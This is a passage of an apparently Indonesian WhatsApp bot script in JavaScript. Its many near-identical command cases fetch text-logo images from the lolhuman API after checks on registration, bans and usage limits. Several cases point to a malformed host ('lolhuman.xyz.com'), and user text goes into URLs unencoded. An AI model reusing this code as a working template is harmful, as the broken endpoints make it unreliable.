if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/logogaming?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'aovwall':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/aovwall?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'pubgmaskot':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/pubgmaskot?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'anonymhacker':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/anonymhacker?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'fpslogo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/fpslogo?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'glitch':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome2/glitch?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'hartacustom':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/hartacustom?apikey=${lolkey}&text=${q.split("|")[0]}%0A${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'cloud':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://lolhuman.xyz.com/api/textprome/cloud?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'toxicmaker':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendMessage(from, await getBuffer(`https://lolhuman.xyz.com/api/textprome/toxic?apikey=${lolkey}&text=${q}`), image, msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'greenneon': case 'gn':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/greenneon?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'horrorblood': case 'hb':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/horrorblood?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'text1917':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/text1917?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'sandwriting': case 'sw':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://lolhuman.xyz.com/api/textprome/sandwriting?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'sandsummer':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://lolhuman.xyz.com/api/textprome/sandsummer?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'advanceglow': case 'ag':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://lolhuman.xyz.com/api/textprome/advanceglow?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'futureneon': case 'fn':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://lolhuman.xyz.com/api/textprome/futureneon?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'halloween':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/halloween?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'bokeh': case 'bokehtext':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/bokeh?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'holographic': case 'hgp':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://lolhuman.xyz.com/api/textprome/holographic?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'neon': case 'neontext':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/neon?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'harta': case 'hartatahta': case 'tahta':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'thunder':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/thunder?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'pornhub': case 'phlogo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome2/pornhub?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'sandengraved':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/sandengraved?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'metaldark':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/metaldark?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'neonlight':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/neonlight?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'minion':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/minion?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'deluxesilver':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/deluxesilver?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'newyearcard': case 'nyc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/newyearcard?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'bloodfrosted': case 'bod':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/bloodfrosted?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'jokerlogo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/jokerlogo?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'fireworksparkle': case 'fws':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/fireworksparkle?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'natureleaves': case 'nls':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/natureleaves?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'strawberry':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/strawberry?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'box3d':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/box3d?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'roadwarning':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/roadwarning?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'breakwall':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/breakwall?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'icecold':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/icecold?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'luxury':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/luxury?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'summersand':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome/summersand?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'avenger':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome2/avenger?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'space':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome2/space?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'ninjalogo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome2/ninjalogo?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'marvelstudio':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome2/marvelstudio?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'lionlogo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (args.length < 2) return textImg(`Penggunaan ${command} text1|text2`)
if (!q.includes("|")) return textImg(`Penggunaan ${command} text1|text2`)
Flink(mess.wait)
surya.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textprome2/lion?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
limitAdd(sender, limit)
break

case 'wolflogo':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
